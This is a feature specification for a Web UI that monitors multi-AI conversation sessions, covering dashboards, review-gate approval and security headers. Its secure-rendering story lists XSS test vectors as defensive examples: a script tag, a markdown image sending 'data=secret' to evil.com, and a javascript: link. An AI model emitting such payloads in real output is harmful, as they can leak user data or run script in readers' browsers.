# Feature Specification: Web UI

**Feature Branch**: `011-web-ui`
**Created**: 2026-04-16
**Status**: Ready for planning
**Input**: Constitution S14 Phase 2 scope + sacp-web-ui-spec.md design reference
**Reference**: `sacp-web-ui-spec.md` (detailed design document, not normative — this spec selects what to build)

## Clarifications

*None yet — pending first implementation session.*

## User Scenarios & Testing *(mandatory)*

### User Story 1 - Facilitator Creates and Monitors a Session (Priority: P1)

A facilitator opens the Web UI at port 8751, enters their bearer token, and lands on a session view showing the live transcript, participant list, and session controls. They can inject messages, pause/resume the loop, add participants, and watch AI turns stream in real-time via WebSocket.

**Why this priority**: This is the primary use case — replacing Swagger UI as the operational interface.

**Acceptance Scenarios**:

1. **Given** a valid facilitator token, **When** they log in, **Then** the session view loads with transcript, participant sidebar, and controls.
2. **Given** a running session, **When** a new AI turn completes, **Then** the message appears in the transcript within 2 seconds via WebSocket.
3. **Given** the facilitator view, **When** they type a message and press Ctrl+Enter, **Then** the message is injected into the session.
4. **Given** a running loop, **When** the facilitator clicks Pause, **Then** the loop stops and the status badge updates to "paused".

---

### User Story 2 - Participant Observes and Interjects (Priority: P1)

A participant enters their token and sees the transcript and their own controls (routing mode, prompt tier). They can inject messages but cannot access facilitator-only controls (add/remove participants, session config, audit log).

**Why this priority**: Participants need a usable interface beyond Swagger to follow and contribute to conversations.

**Acceptance Scenarios**:

1. **Given** a participant token, **When** they log in, **Then** facilitator-only controls are hidden.
2. **Given** a participant view, **When** they inject a message, **Then** it appears in the transcript at the correct position.
3. **Given** a participant, **When** they change their routing preference, **Then** the change takes effect on the next turn.

---

### User Story 3 - Real-Time WebSocket Streaming (Priority: P1)

The UI maintains a WebSocket connection to the server for push-based updates. New messages, participant status changes, convergence updates, and session events arrive without polling. The connection auto-reconnects on drop with exponential backoff.

**Why this priority**: Polling the REST API would miss real-time events and waste bandwidth. WebSocket is the backbone of the live experience.

**Acceptance Scenarios**:

1. **Given** a connected WebSocket, **When** a turn completes, **Then** a `message` event arrives with full message content.
2. **Given** a dropped connection, **When** the client reconnects, **Then** it receives a full `state_snapshot` to resync.
3. **Given** an expired token, **When** the WebSocket closes with code 4401, **Then** the client stops reconnecting and shows a re-login prompt.

---

### User Story 4 - Budget and Convergence Dashboard (Priority: P2)

The right sidebar displays per-participant budget utilization (spend vs. limit) and a convergence sparkline showing similarity over the last 50 turns. The facilitator sees exact costs; participants see their own costs and utilization percentages for others.

**Why this priority**: Situational awareness for cost management and conversation quality. Without this, facilitators must repeatedly call debug/export to check costs and convergence.

**Acceptance Scenarios**:

1. **Given** a participant with `budget_daily` set, **When** turns accrue cost, **Then** the budget bar shows utilization percentage and changes color as it approaches 100%.
2. **Given** 10+ turns, **When** convergence is computed, **Then** the sparkline graph renders similarity scores with a threshold line.
3. **Given** a non-facilitator participant, **When** viewing another participant's budget card, **Then** only the utilization percentage is shown, not exact dollar amounts.

---

### User Story 5 - Review Gate Draft Approval (Priority: P2)

When a participant's AI is in `review_gate` mode, drafts appear in the right sidebar with Approve/Edit/Reject buttons. The facilitator can review the draft content, see security flags from the output validation pipeline, and resolve the draft before the timeout expires.

**Why this priority**: Review gate is a key human-in-the-loop safety mechanism. Without a UI, approval requires raw API calls.

**Acceptance Scenarios**:

1. **Given** a participant in review_gate mode, **When** their AI generates a response, **Then** the draft appears in the ReviewGateQueue with content and action buttons.
2. **Given** a pending draft, **When** the facilitator clicks Approve, **Then** the response enters the transcript.
3. **Given** a pending draft, **When** the timeout expires, **Then** the draft is auto-rejected and the turn is skipped.

---

### User Story 6 - Facilitator Admin Panel (Priority: P2)

The facilitator has a collapsible admin panel in the left sidebar with: pending participant approvals, session config editing, invite link generation, and an audit log of facilitator actions.

**Why this priority**: Session management currently requires multiple Swagger endpoints. Consolidating into a panel improves facilitator workflow.

**Acceptance Scenarios**:

1. **Given** a pending participant, **When** the facilitator clicks Approve, **Then** the participant becomes active and appears in the participant list.
2. **Given** the session config panel, **When** the facilitator changes `convergence_threshold`, **Then** the change is applied and logged in the audit trail.
3. **Given** the invite generator, **When** the facilitator clicks Generate, **Then** a copyable invite link is shown.

---

### User Story 7 - Proposal and Decision Tracking (Priority: P3)

Participants can create proposals (decisions to be voted on). Active proposals appear in the right sidebar with vote tallies. Participants vote Accept/Reject/Abstain. Resolved proposals collapse to a summary line.

**Why this priority**: Decision tracking is a Phase 2 constitution requirement but can ship after core UI is stable.

**Acceptance Scenarios**:

1. **Given** an active proposal, **When** a participant votes, **Then** the tally updates in real-time for all connected users.
2. **Given** all participants have voted, **When** the proposal resolves, **Then** it moves to the resolved section with final status.

---

### User Story 9 - Summary Viewer (Priority: P2)

The facilitator (or any participant) can open a "Summary" panel that displays the latest structured summarization checkpoint for the session: decisions, open questions, key positions per participant, and a narrative overview. The view refreshes when a new checkpoint is generated.

**Why this priority**: Phase 1 generates structured summaries every N turns (`GET /tools/session/summary`), but without a UI the facilitator has to read raw JSON to review them. This is the primary artifact for long-running sessions.

**Acceptance Scenarios**:

1. **Given** a session with at least one summarization checkpoint, **When** the user opens the Summary panel, **Then** decisions, open questions, key positions, and narrative render as readable sections.
2. **Given** the Summary panel is open, **When** a new checkpoint is generated, **Then** the panel refreshes to the newest summary.
3. **Given** a session with no summary yet, **When** the user opens the panel, **Then** a placeholder indicates "no checkpoint yet" with the turn threshold info.

---

### User Story 10 - Participant Health Indicators (Priority: P2)

Each participant card in the left sidebar surfaces health state: `active`, `paused` (manually or by circuit breaker), `offline`, `pending approval`. When a participant is auto-paused by the circuit breaker (`consecutive_timeouts ≥ 3`), the card shows a distinct "breaker tripped" badge with the failure count, distinguishing it from manual pauses. The facilitator can see recent failure reasons (from `routing_log` skip entries).

**Why this priority**: Phase 1 auto-pauses participants on repeated provider failures, but without a health indicator facilitators can't tell *why* an AI went quiet — was it removed, paused manually, or tripped by auth errors? This is critical for diagnosing session issues.

**Acceptance Scenarios**:

1. **Given** a participant with `consecutive_timeouts=3` and `status=paused`, **When** viewing their card, **Then** a "breaker tripped" badge is visible with the timeout count.
2. **Given** a manually paused participant, **When** viewing their card, **Then** the badge reads "paused" without the breaker indicator.
3. **Given** a facilitator view, **When** a participant has recent skip entries, **Then** hovering the health badge shows the last 3 skip reasons.

---

### User Story 8 - Secure Content Rendering (Priority: P1)

AI-generated message content is rendered as markdown with mandatory security controls: raw HTML stripped, images neutralized, links sanitized, invisible Unicode characters revealed. Review gate drafts display output validation risk scores and security flags.

**Why this priority**: The transcript renders untrusted AI output. Without security controls, the UI is vulnerable to XSS, data exfiltration via markdown images, and context poisoning via invisible characters.

**Acceptance Scenarios**:

1. **Given** a message containing `<script>alert(1)</script>`, **When** rendered, **Then** the script tag is stripped entirely.
2. **Given** a message containing `![img](https://evil.com/x?data=secret)`, **When** rendered, **Then** the image is replaced with `[Image: img]` text.
3. **Given** a message containing zero-width spaces, **When** rendered, **Then** visible `[ZWS]` markers appear and a warning badge shows the count.
4. **Given** a link with `javascript:` scheme, **When** rendered, **Then** the link is blocked and replaced with a warning span.

---

## Requirements *(mandatory)*

### Functional Requirements

- **FR-001**: Web UI served by FastAPI on port 8751, separate from the MCP API on 8750.
- **FR-002**: Single-file React JSX (CDN-loaded, no build toolchain). Split to modules if exceeding ~2000 lines.
- **FR-003**: Bearer token authentication via login screen. Token held in HttpOnly cookie or React ref — never in localStorage/sessionStorage.
- **FR-004**: WebSocket connection at `ws://<host>:8751/ws/{session_id}` for real-time push events.
- **FR-005**: Server sends `state_snapshot` on WebSocket connect with full session state.
- **FR-006**: Transcript renders markdown with security overrides: HTML stripping, image neutralization, link sanitization, invisible character revealing.
- **FR-007**: Three-column layout: left sidebar (participants + controls), center (transcript + input), right sidebar (budget + convergence + proposals + review gate).
- **FR-008**: Responsive: sidebars collapse to drawers below 1024px.
- **FR-009**: Facilitator controls gated by role — hidden for non-facilitator participants.
- **FR-010**: Budget dashboard shows per-participant spend vs. limits with data visibility enforcement per privacy policy.
- **FR-011**: Convergence sparkline graph of similarity over last 50 turns with threshold line.
- **FR-012**: Review gate queue with Approve/Edit/Reject and timeout countdown. Backed by Phase 1 endpoints: `GET /tools/facilitator/list_drafts`, `POST /tools/facilitator/approve_draft`, `POST /tools/facilitator/reject_draft`, `POST /tools/facilitator/edit_draft`.
- **FR-013**: Proposal tracker with voting and real-time tally updates.
- **FR-014**: Auto-reconnecting WebSocket with exponential backoff. Respects close codes (4401 = stop, 4403 = stop, 1006 = retry).
- **FR-015**: Message injection via text input with Ctrl+Enter send. Backed by `POST /tools/participant/inject_message`.
- **FR-016**: Facilitator admin panel: pending approvals, session config, invite generation, audit log. Backed by `POST /tools/facilitator/{approve_participant,reject_participant,remove_participant,create_invite,transfer_facilitator,set_budget,set_routing_preference}` and the audit rows from `GET /tools/debug/export`.
- **FR-017**: Session export (markdown/JSON) via download button. Backed by `GET /tools/session/{export_markdown,export_json}`.
- **FR-018**: Summary panel rendering the latest structured checkpoint. Backed by `GET /tools/session/summary`.
- **FR-019**: Review-gate pause-scope toggle in the facilitator admin panel (session-wide vs. per-participant). Backed by `POST /tools/facilitator/set_review_gate_pause_scope`.
- **FR-020**: Participant health indicator (active / paused-manual / paused-breaker / offline / pending) with breaker-trip count and recent skip reasons surfaced from the `participant_update` WebSocket event and the participant row in `GET /tools/debug/export`.

### Security Requirements

- **SR-001**: CSP header: `default-src 'self'; script-src 'self'; img-src 'self'; frame-ancestors 'none'`. No `data:` URIs for images.
- **SR-002**: HSTS, X-Content-Type-Options, X-Frame-Options, Referrer-Policy, Permissions-Policy headers on all responses.
- **SR-003**: CORS restricted to own origin only. No wildcard.
- **SR-004**: WebSocket upgrade validates Origin header. Mismatched origins rejected.
- **SR-005**: No `dangerouslySetInnerHTML` on unsanitized content. Only on markdown-rendered output with security overrides active.
- **SR-006**: CSRF protection via `X-SACP-Request: 1` custom header on all mutations.
- **SR-007**: API keys and system prompts never displayed in the UI.
- **SR-008**: `Cache-Control: no-store` on all API responses and the HTML page.

### Key Entities

- **SessionView**: The main UI container binding a user to one session's real-time state.
- **WebSocket Event**: A server-push message (message, participant_update, convergence_update, etc.).
- **ReviewGateDraft**: An AI response staged for human approval before entering the transcript.
- **Proposal**: A decision item with voting from participants.
- **Summary**: A structured checkpoint (decisions, open questions, key positions, narrative) generated periodically by the turn loop and returned by `GET /tools/session/summary`.
- **ParticipantHealth**: Derived status combining `status`, `consecutive_timeouts`, and recent `routing_log` skip entries for a participant, used by the health indicator.

## Success Criteria *(mandatory)*

### Measurable Outcomes

- **SC-001**: Facilitator can create a session, add participants, inject messages, and monitor the loop entirely from the Web UI — no Swagger needed.
- **SC-002**: New AI turns appear in the transcript within 2 seconds of completion via WebSocket.
- **SC-003**: WebSocket reconnects within 30 seconds of a network drop and resyncs state.
- **SC-004**: All XSS test vectors (script tags, markdown images, javascript: links, invisible Unicode) are neutralized in rendered output.
- **SC-005**: Budget dashboard shows real cost data matching debug/export values.
- **SC-006**: Review gate drafts can be approved/rejected from the UI, with the result appearing in the transcript.

## Assumptions

- Phase 1 MCP API (port 8750) remains the backend. The Web UI adds a second FastAPI app on port 8751 that proxies to the same database and services.
- No build toolchain — React, ReactDOM, and marked loaded from CDN. All components in a single HTML file (or small number of JS modules).
- Dark theme default. Light theme toggle is desirable but not required for initial ship.
- WebSocket is server-push only. Client mutations go through REST endpoints. The WebSocket carries `pong` and `subscribe` messages from client.
- Virtualized transcript scrolling deferred until performance degrades (simple DOM rendering with ~200 message cap initially).
- Session creation wizard, invite/onboarding flow, and export UI are simple enough to implement directly from the API spec — no separate sub-specs needed.
- Branching UI, sub-session navigation, and OAuth 2.1 are Phase 3 — not in scope here.
- Accessibility audit (keyboard nav, ARIA, screen reader) is a follow-up pass after initial implementation.

## Topology and Use Case Coverage (V12/V13)

**Topologies**: Serves topologies 1-6 (orchestrator-driven). Topology 7 (MCP-to-MCP) would use the same WebSocket events but with different auth flow — deferred to Phase 3.

**Use cases**: All 7 constitution use cases benefit from the Web UI. Especially valuable for: knowledge-base (US1, long-running sessions need a dashboard), debate (US2, proposal voting UI), consulting (US4, review gate approval), and zero-trust cross-org (US5, facilitator admin controls).

## Implementation Phases

The Web UI is large enough to warrant internal phasing:

### Phase 2a — Core (ship first)
- AuthGate (token login)
- Three-column layout skeleton
- Transcript with markdown rendering + security pipeline
- Message injection input
- Participant list sidebar
- WebSocket connection + reconnection
- Session controls (pause/resume/start/stop loop)
- Facilitator: add participant, set routing preference, set budget
- Header bar (session name, status, turn counter, connection indicator)

### Phase 2a — Core (ship first, continued)
- Participant health indicator (US10) — lives on the participant list from 2a, surfaces breaker trips so facilitators can diagnose silent AIs immediately

### Phase 2b — Dashboard
- Budget dashboard (per-participant spend cards)
- Convergence sparkline graph
- Cadence indicator
- Summary panel (US9) — renders latest structured checkpoint
- Facilitator admin panel (pending approvals, session config, invite gen, audit log, review-gate pause-scope toggle)

### Phase 2c — Workflows
- Review gate queue with approve/edit/reject
- Proposal tracker with voting
- Session export (markdown/JSON download)
- Summarization timeline scrubber

## Out of Scope

- Branching UI and rollback visualization (Phase 3)
- Sub-session tree navigation (Phase 3)
- OAuth 2.1 with PKCE login flow (Phase 3)
- MCP-to-MCP topology 7 integration (Phase 3)
- Artifact store (Phase 3)
- Internationalization
- Native mobile app
